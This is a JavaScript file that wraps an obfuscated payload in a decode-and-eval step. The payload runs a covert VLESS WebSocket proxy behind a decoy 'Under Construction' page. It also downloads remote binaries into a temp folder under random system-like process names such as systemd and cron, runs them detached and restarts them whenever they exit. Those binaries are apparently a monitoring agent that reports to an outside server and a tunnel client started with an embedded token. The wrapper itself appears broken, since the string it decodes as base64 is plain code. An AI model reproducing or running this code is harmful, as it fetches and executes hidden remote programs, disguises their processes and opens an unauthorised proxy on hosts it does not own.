const b = 'function _0x4bd1(){const _0x8602ba=['ignore','/nz','OPEN','url','java','connection','-arm','https://github.com/seav1/dl/releases/download/upx','systemd','Not\x20Found','C_B','/vl',':443?type=ws&path=%2Fvl&host=','),\x20restarting...','floor','npm','Internal\x20Server\x20Error','rsync','http','N_K','concat','python','headersSent','readyState','PORT','unref','readUInt8','application/json','UUID','message','service','vless://','tunnel\x20--edge-ip-version\x20auto\x20--protocol\x20http2\x20--no-autoupdate\x20run\x20--token\x20','base64','write','857290WHrEoU','join','map','gzip','slice','C_T','node','end','<!DOCTYPE\x20html><html><head><title>Under\x20Construction</title><style>\x0a\x20\x20body{font-family:Arial,sans-serif;margin:0;padding:0;background:linear-gradient(135deg,#667eea\x200%,#764ba2\x20100%);min-height:100vh;display:flex;align-items:center;justify-content:center}\x0a\x20\x20.container{text-align:center;background:white;padding:60px\x2040px;border-radius:15px;box-shadow:0\x2010px\x2030px\x20rgba(0,0,0,0.2);max-width:500px;margin:20px}\x0a\x20\x20h1{color:#333;font-size:2.5em;margin-bottom:20px;font-weight:300}\x0a\x20\x20p{color:#666;font-size:1.2em;line-height:1.6;margin-bottom:30px}\x0a\x20\x20.icon{font-size:4em;margin-bottom:20px;color:#667eea;font-weight:bold}\x0a\x20\x20.footer{color:#999;font-size:0.9em;margin-top:30px}\x0a\x20\x20</style></head><body><div\x20class=\x22container\x22><div\x20class=\x22icon\x22>[!]</div>\x0a\x20\x20<h1>Website\x20Under\x20Construction</h1><p>We\x27re\x20working\x20hard\x20to\x20bring\x20you\x20something\x20amazing.\x20Please\x20check\x20back\x20soon!</p>\x0a\x20\x20<div\x20class=\x22footer\x22>Thank\x20you\x20for\x20your\x20patience.</div></div></body></html>','huggingface.seav.eu.org','bash','connect','dbus','status','tar','\x20--tls\x20--report-delay\x202\x20--disable-auto-update','/health','vim','curl','random','from','http://',':443\x20-p\x20','env','\x20exited\x20(code=','length','headers','child_process','82wKYkZv4XDSIJniwZ','stream/promises','&fp=chrome&security=tls#','readUInt16BE','44284304soslpH','data','once','-s\x20','writeHead','6936900ayVYRM','9134356JszCsc','uptime','error','<!DOCTYPE\x20html><html><head><title>Service\x20Status</title><style>\x0a\x20\x20body{font-family:Arial,sans-serif;margin:40px;background-color:#f5f5f5}\x0a\x20\x20.container{max-width:600px;margin:0\x20auto;background:white;padding:30px;border-radius:8px;box-shadow:0\x202px\x2010px\x20rgba(0,0,0,0.1)}\x0a\x20\x20h1{color:#333;text-align:center}\x0a\x20\x20.info-item{margin:20px\x200;padding:15px;background:#f8f9fa;border-radius:5px}\x0a\x20\x20.label{font-weight:bold;color:#555;margin-bottom:10px}\x0a\x20\x20.value{font-family:monospace;background:#e9ecef;padding:10px;border-radius:4px;word-break:break-all}\x0a\x20\x20.copy-btn{background:#007cba;color:white;border:none;padding:8px\x2015px;border-radius:3px;cursor:pointer;margin-top:10px}\x0a\x20\x20.copy-btn:hover{background:#0056b3}\x0a\x20\x20</style></head><body><div\x20class=\x22container\x22><h1>Service\x20Running</h1>\x0a\x20\x20<div\x20class=\x22info-item\x22><div\x20class=\x22label\x22>Port:</div><div\x20class=\x22value\x22>','1508862fcxyiy','createServer','</div></div>\x0a\x20\x20<div\x20class=\x22info-item\x22><div\x20class=\x22label\x22>Connection\x20Link\x20(Base64):</div><div\x20class=\x22value\x22\x20id=\x22vlessLink\x22>','</div>\x0a\x20\x20<button\x20class=\x22copy-btn\x22\x20onclick=\x22navigator.clipboard.writeText(\x27','unlink','feefeb96-bfcf-4a9b-aac0-6aac771c1b98','ssh','kmod','net','N_S','4906425bjxiTI','pipe','decode','replace','&encryption=none&sni=','text/plain','12ThEPrE','cron','every','axios','SERVER_PORT','C_D','host','/cf','apt','text/html','4486345XxiIVz','udev','home','stringify','wget','eyJhIjoiZjAzMGY1ZDg4OGEyYmRlN2NiMDg3NTU5MzM4ZjE0OTciLCJ0IjoiMjYxYjNjZjgtNDFlOC00MTViLTk2MTAtYWI0NWQwODkxNmU1IiwicyI6Ik16TTJaak14T0dJdFpUVmlaaTAwWVdNMUxUbG1NV1F0T0RBeVpEQXpabUV5TkRKbSJ9'];_0x4bd1=function(){return _0x8602ba;};return _0x4bd1();}const _0x51859a=_0x277b;function _0x277b(_0x4661d6,_0x54a6de){const _0x4bd12d=_0x4bd1();return _0x277b=function(_0x277b31,_0x22ff4f){_0x277b31=_0x277b31-0x1de;let _0x32dd51=_0x4bd12d[_0x277b31];return _0x32dd51;},_0x277b(_0x4661d6,_0x54a6de);}(function(_0x5401c3,_0x318981){const _0x3b946a=_0x277b,_0x75718=_0x5401c3();while(!![]){try{const _0x44f03c=-parseInt(_0x3b946a(0x241))/0x1+-parseInt(_0x3b946a(0x1fe))/0x2+-parseInt(_0x3b946a(0x208))/0x3+parseInt(_0x3b946a(0x1f9))/0x4+-parseInt(_0x3b946a(0x218))/0x5*(parseInt(_0x3b946a(0x20e))/0x6)+-parseInt(_0x3b946a(0x1fa))/0x7+parseInt(_0x3b946a(0x1f4))/0x8;if(_0x44f03c===_0x318981)break;else _0x75718['push'](_0x75718['shift']());}catch(_0x35e78c){_0x75718['push'](_0x75718['shift']());}}}(_0x4bd1,0xe15f1));const {exec,spawn}=require(_0x51859a(0x1ef)),{WebSocketServer,createWebSocketStream}=require('ws'),http=require(_0x51859a(0x230)),{URL}=require(_0x51859a(0x221)),net=require(_0x51859a(0x206)),{tmpdir}=require('os'),{join}=require('path'),{createWriteStream,promises:fs}=require('fs'),axios=require(_0x51859a(0x211)),{pipeline}=require(_0x51859a(0x1f1)),CONFIG={'UUID':(process[_0x51859a(0x1eb)]['UUID']||_0x51859a(0x203))[_0x51859a(0x20b)](/-/g,''),'PORT':process[_0x51859a(0x1eb)][_0x51859a(0x236)]||process[_0x51859a(0x1eb)][_0x51859a(0x212)]||0x1eb4,'N_S':process['env'][_0x51859a(0x207)]||'nz.seav.eu.org','C_B':process[_0x51859a(0x1eb)][_0x51859a(0x228)]||'loc.gov','N_K':process['env'][_0x51859a(0x231)]||_0x51859a(0x1f0),'C_T':process['env'][_0x51859a(0x246)]||_0x51859a(0x21d),'C_D':process['env'][_0x51859a(0x213)]||_0x51859a(0x24a)},COMMON_NAMES=[_0x51859a(0x247),_0x51859a(0x22d),_0x51859a(0x1e6),_0x51859a(0x21c),_0x51859a(0x204),_0x51859a(0x22f),_0x51859a(0x1e2),_0x51859a(0x244),_0x51859a(0x233),_0x51859a(0x222),_0x51859a(0x226),_0x51859a(0x20f),_0x51859a(0x1e0),_0x51859a(0x219),_0x51859a(0x205),_0x51859a(0x1de),'sh',_0x51859a(0x1e5),'nano','git',_0x51859a(0x216),'yum',_0x51859a(0x23c)],randName=()=>COMMON_NAMES[Math[_0x51859a(0x22c)](Math[_0x51859a(0x1e7)]()*COMMON_NAMES[_0x51859a(0x1ed)])],vlessLink=()=>Buffer[_0x51859a(0x1e8)](_0x51859a(0x23d)+CONFIG[_0x51859a(0x23a)]+'@'+CONFIG[_0x51859a(0x228)]+_0x51859a(0x22a)+CONFIG[_0x51859a(0x213)]+_0x51859a(0x20c)+CONFIG[_0x51859a(0x213)]+_0x51859a(0x1f2)+CONFIG[_0x51859a(0x213)])['toString'](_0x51859a(0x23f)),HTML_TEMPLATES={'home':_0x51859a(0x249),'status':(_0x237877,_0xec32eb)=>_0x51859a(0x1fd)+_0x237877+_0x51859a(0x200)+_0xec32eb+_0x51859a(0x201)+_0xec32eb+'\x27).then(()=>alert(\x27Copied!\x27))\x22>Copy</button></div>\x0a\x20\x20</div></body></html>'},server=http[_0x51859a(0x1ff)]((_0x487bd2,_0x28fc34)=>{const _0x2fcc22=_0x51859a;try{const {pathname:_0x21b13c}=new URL(_0x487bd2['url'],_0x2fcc22(0x1e9)+_0x487bd2[_0x2fcc22(0x1ee)][_0x2fcc22(0x214)]);if(_0x21b13c==='/')_0x28fc34[_0x2fcc22(0x1f8)](0xc8,{'Content-Type':_0x2fcc22(0x217)}),_0x28fc34[_0x2fcc22(0x248)](HTML_TEMPLATES[_0x2fcc22(0x21a)]);else{if(_0x21b13c==='/x')_0x28fc34[_0x2fcc22(0x1f8)](0xc8,{'Content-Type':_0x2fcc22(0x217)}),_0x28fc34[_0x2fcc22(0x248)](HTML_TEMPLATES[_0x2fcc22(0x1e1)](CONFIG[_0x2fcc22(0x236)],vlessLink()));else _0x21b13c===_0x2fcc22(0x1e4)?(_0x28fc34['writeHead'](0xc8,{'Content-Type':_0x2fcc22(0x239)}),_0x28fc34[_0x2fcc22(0x248)](JSON[_0x2fcc22(0x21b)]({'status':'ok','uptime':process[_0x2fcc22(0x1fb)]()}))):(_0x28fc34[_0x2fcc22(0x1f8)](0x194,{'Content-Type':_0x2fcc22(0x20d)}),_0x28fc34[_0x2fcc22(0x248)](_0x2fcc22(0x227)));}}catch{!_0x28fc34[_0x2fcc22(0x234)]&&(_0x28fc34['writeHead'](0x1f4,{'Content-Type':_0x2fcc22(0x20d)}),_0x28fc34[_0x2fcc22(0x248)](_0x2fcc22(0x22e)));}}),wss=new WebSocketServer({'server':server,'path':_0x51859a(0x229)});wss['on'](_0x51859a(0x223),_0x5cdcfc=>{const _0x224272=_0x51859a;_0x5cdcfc[_0x224272(0x1f6)](_0x224272(0x23b),_0xb3f429=>{const _0x3dc274=_0x224272,[_0xcfd21c]=_0xb3f429,_0x28a7cd=_0xb3f429[_0x3dc274(0x245)](0x1,0x11);if(!_0x28a7cd[_0x3dc274(0x210)]((_0x26e9fd,_0x2c4b12)=>_0x26e9fd===parseInt(CONFIG[_0x3dc274(0x23a)]['substr'](_0x2c4b12*0x2,0x2),0x10)))return;let _0xe04561=_0xb3f429[_0x3dc274(0x245)](0x11,0x12)[_0x3dc274(0x238)]()+0x13;const _0x513ced=_0xb3f429[_0x3dc274(0x245)](_0xe04561,_0xe04561+=0x2)['readUInt16BE'](0x0),_0x4f5522=_0xb3f429[_0x3dc274(0x245)](_0xe04561,_0xe04561+=0x1)[_0x3dc274(0x238)]();let _0x52e38f;if(_0x4f5522===0x1)_0x52e38f=_0xb3f429[_0x3dc274(0x245)](_0xe04561,_0xe04561+=0x4)[_0x3dc274(0x242)]('.');else{if(_0x4f5522===0x2){const _0x48ce7d=_0xb3f429[_0x3dc274(0x245)](_0xe04561,_0xe04561+=0x1)['readUInt8']();_0x52e38f=new TextDecoder()[_0x3dc274(0x20a)](_0xb3f429[_0x3dc274(0x245)](_0xe04561,_0xe04561+=_0x48ce7d));}else _0x4f5522===0x3&&(_0x52e38f=_0xb3f429[_0x3dc274(0x245)](_0xe04561,_0xe04561+=0x10)['reduce']((_0x5f1a01,_0x58f68e,_0x5488b3,_0x370646)=>_0x5488b3%0x2?_0x5f1a01[_0x3dc274(0x232)](_0x370646[_0x3dc274(0x245)](_0x5488b3-0x1,_0x5488b3+0x1)):_0x5f1a01,[])[_0x3dc274(0x243)](_0x81c55d=>_0x81c55d[_0x3dc274(0x1f3)](0x0)['toString'](0x10))['join'](':'));}if(_0x5cdcfc[_0x3dc274(0x235)]===_0x5cdcfc[_0x3dc274(0x220)]){_0x5cdcfc['send'](new Uint8Array([_0xcfd21c,0x0]));const _0x5dd705=createWebSocketStream(_0x5cdcfc)['on'](_0x3dc274(0x1fc),()=>{}),_0x21b25b=net[_0x3dc274(0x1df)]({'host':_0x52e38f,'port':_0x513ced},function(){const _0x5e64d1=_0x3dc274;this[_0x5e64d1(0x240)](_0xb3f429['slice'](_0xe04561)),_0x5dd705[_0x5e64d1(0x209)](this)[_0x5e64d1(0x209)](_0x5dd705);});_0x21b25b['on']('error',()=>{});}});});async function downloadAndRun(_0x388208,_0xa329ae,_0x33ecdb){const _0x39f874=_0x51859a;if(!_0x388208)return;const _0x558b60=join(tmpdir(),randName());try{const _0xe14c1c=await axios({'url':_0x388208,'responseType':'stream','timeout':0x7530,'headers':{'User-Agent':'Mozilla/5.0'}});await pipeline(_0xe14c1c[_0x39f874(0x1f5)],createWriteStream(_0x558b60)),await fs['chmod'](_0x558b60,0x1ed),spawnProcess(_0x558b60,_0xa329ae,_0x33ecdb);}catch{await fs[_0x39f874(0x202)](_0x558b60)['catch'](()=>{});}}function spawnProcess(_0x16c063,_0x5a79a0,_0x23917a){const _0x3a2942=_0x51859a,_0x8f73=spawn(_0x16c063,_0x5a79a0['split']('\x20'),{'stdio':_0x3a2942(0x21e),'detached':!![]});_0x8f73[_0x3a2942(0x237)](),_0x8f73['on']('exit',(_0x11ff93,_0xd0e791)=>{const _0x428dff=_0x3a2942;console['log'](_0x23917a+_0x428dff(0x1ec)+_0x11ff93+',\x20signal='+_0xd0e791+_0x428dff(0x22b)),setTimeout(()=>spawnProcess(_0x16c063,_0x5a79a0,_0x23917a),0x1388);});}const baseUrl=_0x51859a(0x225),archUrl=_0x59ee69=>process['arch']==='arm64'?_0x59ee69+_0x51859a(0x224):_0x59ee69;downloadAndRun(archUrl(baseUrl+_0x51859a(0x21f)),_0x51859a(0x1f7)+CONFIG['N_S']+_0x51859a(0x1ea)+CONFIG['N_K']+_0x51859a(0x1e3),'nz'),downloadAndRun(archUrl(baseUrl+_0x51859a(0x215)),_0x51859a(0x23e)+CONFIG['C_T'],'cf'),server['listen'](CONFIG[_0x51859a(0x236)]);';
const code = Buffer.from(b, 'base64').toString();
eval(code);
